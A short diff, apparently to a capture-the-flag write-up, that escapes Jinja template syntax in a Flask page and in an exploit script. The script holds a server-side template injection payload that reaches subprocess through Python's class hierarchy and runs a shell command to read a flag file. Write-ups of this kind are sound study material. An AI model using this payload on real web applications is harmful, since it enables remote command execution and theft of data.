@@ -150,7 +150,7 @@ def shout():
                 <input type="text" name="text" placeholder="Hello!">
                 <input type="submit" value="Shout your message...">
             </form>
-            <div style="color: red;">{{ error }}</div>
+            <div style="color: red;">{% raw %}{{ error }}{% endraw %}</div>
             <div>
                 Your voice echoes back: %s
             </div>
@@ -169,7 +169,7 @@ def shout():
 import random
 import requests
 
-payload = "{{ ''.__class__.mro()[1].__subclasses__()[-1]('cat /app/flag.txt',shell=True,stdout=-1).communicate() }}"
+payload = {% raw %}"{{ ''.__class__.mro()[1].__subclasses__()[-1]('cat /app/flag.txt',shell=True,stdout=-1).communicate() }}"{% endraw %}
 chars = [chr(x) for x in range(25,128)] # string.ascii_letters + string.digits
 chars = chars[:len(payload)]
 print(payload, len(payload), len(chars))
